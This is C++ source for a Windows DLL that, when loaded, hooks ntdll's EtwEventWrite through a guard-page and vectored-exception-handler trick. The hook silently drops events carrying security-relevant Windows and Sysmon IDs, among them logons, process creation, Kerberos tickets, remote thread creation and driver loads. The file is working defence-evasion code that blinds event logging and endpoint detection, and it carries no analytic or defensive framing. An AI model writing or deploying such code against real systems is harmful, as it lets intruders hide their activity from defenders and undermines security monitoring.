#include <windows.h>
#include <evntprov.h>  
#include <stdio.h>
#include <vector>
#include <string>
#include <tchar.h>

#pragma comment(lib, "ntdll.lib")


std::vector<int> sensitiveEventIDs = {
	4688,  // New process created
	4697,  // A service was installed
	4673,  // Privileged service was called
	4674,  // Operation attempted on a privileged object
	4624,  // Successful logon
	4625,  // Failed logon
	4648,  // Logon using explicit credentials
	4634,  // Logoff
	4647,  // User initiated logoff
	4768,  // Kerberos authentication ticket (TGT) requested
	4769,  // Kerberos service ticket requested
	4776,  // Credential validation via LSASS
	4720,  // User account created
	4722,  // User account enabled
	4724,  // Password reset attempted
	4732,  // User added to group
	4733,  // User removed from group
	4672,  // Logon with special privileges

	// Sysmon event IDs
	1,     // Sysmon: Process creation
	3,     // Sysmon: Network connection
	7,     // Sysmon: DLL loaded
	8,     // Sysmon: CreateRemoteThread detected
	10,    // Sysmon: Process access (code injection, etc.)
	11,    // Sysmon: File created
	13,    // Sysmon: Registry value set
	22,    // Sysmon: Named pipe created
	23,    // Sysmon: Named pipe connected
	25     // Sysmon: Driver loaded
};


typedef ULONG(WINAPI* pEtwEventWrite)(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
	);

pEtwEventWrite g_EtwEventWrite = nullptr;


ULONG WINAPI MyEtwEventWrite(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
) {
	char buffer[512];

	sprintf_s(buffer,
		"[HOOK] EtwEventWrite\nRegHandle: %p\nEvent ID: %u\nUserDataCount: %lu\n",
		(void*)RegHandle,
		EventDescriptor->Id,
		UserDataCount
	);

	OutputDebugStringA(buffer);

	if (std::find(sensitiveEventIDs.begin(), sensitiveEventIDs.end(), EventDescriptor->Id) != sensitiveEventIDs.end()) {
		OutputDebugStringA("[HOOK] >>> Sensitive Event ID detected, suppressing...\n");
		return 0;
	}

	return g_EtwEventWrite(RegHandle, EventDescriptor, UserDataCount, UserData);
}



void ForceEtwCall() {
	OutputDebugStringA("Calling EtwEventWrite manually to trigger hook...\n");

	EVENT_DESCRIPTOR desc;
	desc.Id = 0x01;
	desc.Version = 1;
	desc.Channel = 0;
	desc.Level = 4;       // Informational
	desc.Opcode = 0;
	desc.Task = 1;
	desc.Keyword = 0x1;

	// User data payload (a simple string message)
	const char* message = "Hello from EtwEventWrite!";
	EVENT_DATA_DESCRIPTOR data;
	EventDataDescCreate(&data, message, (ULONG)(strlen(message) + 1)); // Include null terminator

	// Resolve EtwEventWrite function
	pEtwEventWrite EtwFunc = (pEtwEventWrite)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWrite");
	if (EtwFunc) {
		EtwFunc((REGHANDLE)1, &desc, 1, &data);  // (REGHANDLE)1 is a dummy handle
	}
}


LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
		if ((void*)ExceptionInfo->ContextRecord->Rip == g_EtwEventWrite) {
			ExceptionInfo->ContextRecord->Rip = (DWORD64)&MyEtwEventWrite;

			DWORD oldProtect;
			VirtualProtect(g_EtwEventWrite, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

void SetupHook() {
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	g_EtwEventWrite = (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");

	DWORD oldProtect;
	VirtualProtect(g_EtwEventWrite, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);

	AddVectoredExceptionHandler(1, VectoredHandler);
	OutputDebugStringA("Hook installed.\n");

	ForceEtwCall();
}

// Entry point de la DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	if (fdwReason == DLL_PROCESS_ATTACH) {
		DisableThreadLibraryCalls(hinstDLL);
		SetupHook();
	}
	return TRUE;
}